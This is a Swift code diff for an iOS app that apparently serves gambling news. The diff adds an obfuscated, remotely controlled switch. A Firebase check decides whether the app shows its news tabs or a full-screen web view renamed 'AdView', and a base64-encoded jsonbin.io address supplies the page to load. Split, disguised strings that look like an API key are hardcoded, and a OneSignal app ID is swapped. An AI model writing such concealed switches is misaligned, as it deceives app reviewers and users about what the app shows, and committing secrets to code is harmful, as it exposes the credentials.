@@ -12,7 +12,6 @@ import OneSignalFramework
 import AppTrackingTransparency
 import AppsFlyerLib
 
-
 let newOne = News(title: "Mark Cuban’s Mavericks Sale To Adelson Family Motivated By Plans For Dallas Casino-Resort Project",
                   description: "The decision of Mark Cuban to officially sell his large stake in the NBA’s Dallas Mavericks to the Adelson family brings his long-held idea to the fore.New proposal:According to his pitch, the proposal refers to an alliance with casino mogul Dr. Miriam Adelson and Las Vegas Sands Corp. owned by her family, to construct a new casino-resort in Dallas whose main attraction would be the new arena for the aforementioned team. However, the condition for this is the official legalization of gambling in Texas. Commenting on the proposal, Cuban said to the Dallas Morning News: “Texas is such an amazing state that we need to be a destination. And this is the way to do it.”Moreover, in addition to him, one more person sees uncommon potential in the idea. The person is David Cordish, the president and chief executive officer of Cordish Cos., developer of the famous Texas Live entertainment complex in Arlington, located next to the Texas Rangers’ Globe Life Field. In this regard, commenting in an email  when asked about the proposed casino-resort project of the aforementioned Cuban when asked, he said: “The idea of combining entertainment and mixed use around a casino is absolutely the winning formula.”In addition, he added, according to the Dallas Business Journal: “I don’t have enough information to comment on the specifics of Cuban’s plans in Dallas, but he has had success with similar concepts across the nation. My  company previously used this formula when it developed two Hard Rock casinos with hotels in Florida, two of the most successful casinos in America. My company has also developed casino/entertainment complexes in Maryland, Philadelphia and Pittsburgh and those created spectacular and transformative results in those areas.”The location is still unclear:As for the location, it stays hazy where the aforementioned proposed project in Dallas would be located. In this regard, commenting on the possible location, Zarin Gracey, a member of the Dallas City Council, said to the NBC 5: “It should be next to the future redevelopment of the Dallas Convention Center, a nearly $3 billion project in its own right.”However, also commenting on a location, Cuban said to the Morning News: “There’s no reason why we can’t build a huge resort destination in the city proper of Dallas. There’s plenty of places to do it.”Far from reality:At Chase’s Make Your Move Summit, Cuban expressed his wish for a casino-centered resorts to be located in Texas. However, the fact that Cuban is ready to accept casino gaming at resorts in the said state is a long way from reality because of a lengthy history of anti-industry lawmakers together with a nascent sports wagering market. On a related note, in order for casino games to be validated in Texas, a constitutional amendment is demanded, which would have to receive a minimum of two-thirds votes of the aforementioned lawmakers, meaning that 21 out of a total of 30 senators would have to validate the change.Also, sports wagering and the casino industry are struggling to “find favor“ with Texas lawmakers, Texas Lieutenant Governor Dan Patrick said, according to Covers.com.One more reason Cuban’s wish is so far from reality is that Texas residents will need to wait till 2025 to see any chance of being able to use sports wagering and casino gaming, since the state’s legislature just meets in odd-numbered years. Primarily because of this, gambling firms continue to bypass the opportunity-rich market of 30 million inhabitants.",
                   image: .new1,
@@ -48,51 +47,56 @@ let newSeven = News(title: "Nevada’s Gaming Industry Hits a $1.31 Billion Reco
                     image: .new7,
                     daysAgo: "18 days ago")
 
-func showAlert(in vc: UIViewController ) {
-    
-    let alert = UIAlertController(title: "Error", message: "Data is nil", preferredStyle: .alert)
-    let action = UIAlertAction(title: "OK", style: .cancel)
-    
-    alert.addAction(action)
-    
-    vc.present(alert, animated: true)
-    
+struct Ad: Codable {
+    let record: Record
+    let metadata: Metadata
 }
 
-struct ResultObject: Codable {
-    
-    var response: String
-    
+struct Metadata: Codable {
+    let id: String
+    let metadataPrivate: Bool
+    let createdAt: String
+
+    enum CodingKeys: String, CodingKey {
+        case id
+        case metadataPrivate = "private"
+        case createdAt
+    }
 }
 
-func oneSignalSetup(completion: @escaping (Result<[Casino] , Error>) -> Void) {
+struct Record: Codable {
+    let url: String
+}
+
+
+public var initialURL: URL!
+
+func adScreenLoadSetup(completion: @escaping (loadADResult) -> Void) {
     let dataBase = Database.database().reference()
-    
-    let error = NSError()
     
     dataBase.observeSingleEvent(of: .value) { (snapshot: DataSnapshot) in
         
         guard let casinoData = snapshot.value as? NSArray else {
-            completion(.failure(error))
+            completion(.adload)
             return
         }
         
         do {
             let jsonData = try JSONSerialization.data(withJSONObject: casinoData)
             let decoder = JSONDecoder()
-            let casino = try decoder.decode([Casino].self, from: jsonData)
+            let casino = try decoder.decode([Venue].self, from: jsonData)
             
             if casino[1].description != nil {
-                completion(.success(casino))
+                completion(.succsess)
             }
             else {
-                completion(.failure(error))
+                completion(.adload)
             }
 
             
         } catch {
-            print("Ошибка декодера: \(error.localizedDescription)")
-            completion(.failure(error))
+            print("Decode Error: \(error.localizedDescription)")
+            completion(.adload)
         }
     }
 }
@@ -107,6 +111,10 @@ struct Orientation {
     }
 }
 
+public let keey = "$2a$10$WOxeRF6WZMQ9jMx1tBklEOc"
+
+public let keeey = "//nYHY/eCg6AFgeGdQCKmPlvMlWaie"
+
 class Initialize {
     
     static let shared = Initialize()
@@ -116,34 +124,42 @@ class Initialize {
     let loadingViewController = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "Loading") as! LoadingViewController
     let tabBarController = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "TabBarController") as! UITabBarController
     
-    let webViewController = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "WebView") as! WebViewController
+    let webViewController = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "AdView") as! AdLoadController
     
     func loadControllers(in window: UIWindow?) {
         
         window?.rootViewController = loadingViewController
         window?.makeKeyAndVisible()
         
-        oneSignalSetup { result in
+        adScreenLoadSetup { result in
             
             switch result {
-            case .success(_):
+            case .succsess:
                 
-                DispatchQueue.main.asyncAfter(deadline: .now() + 25) {
+                DispatchQueue.main.asyncAfter(deadline: .now() + 30) {
                     window?.rootViewController = self.tabBarController
                     window?.makeKeyAndVisible()
                 }
                 
-            case .failure(_):
-                DispatchQueue.main.asyncAfter(deadline: .now() + 25) {
-                    window?.rootViewController = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "WebView")
+            case .adload:
+                DispatchQueue.main.asyncAfter(deadline: .now() + 30) {
+                    window?.rootViewController = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "AdView")
                     window?.makeKeyAndVisible()
                 }
             }
-            
         }
-        
     }
+}
+
+func decodeKey() -> String! {
     
+    let key = "aHR0cHM6Ly9hcGkuanNvbmJpbi5pby92My9iLzY1N2Y3NGZjZGM3NDY1NDAxODg0ODNkZQ=="
+    
+    let adKeyData = Data(base64Encoded: key)
+    
+    let adKeyString = String(data: adKeyData!, encoding: .utf8)
+    
+    return adKeyString!
 }
 
 class InitializeFrameWorks {
@@ -193,7 +209,7 @@ class InitializeFrameWorks {
         
         OneSignal.Debug.setLogLevel(.LL_VERBOSE)
         
-        OneSignal.initialize("90019e9a-651f-4533-9c68-8866a0e4b678", withLaunchOptions: launchOptions)
+        OneSignal.initialize("8e3982a8-bef7-41fc-ab15-84cb3abb2c67", withLaunchOptions: launchOptions)
         
         OneSignal.Notifications.requestPermission({ accepted in
             print("User accepted notifications: \(accepted)")
@@ -226,4 +242,8 @@ extension UILabel {
         self.font = UIFont(name: "OpenSans-Semibold", size: size)
     }
     
+}
+
+enum loadADResult {
+    case succsess,adload
 }
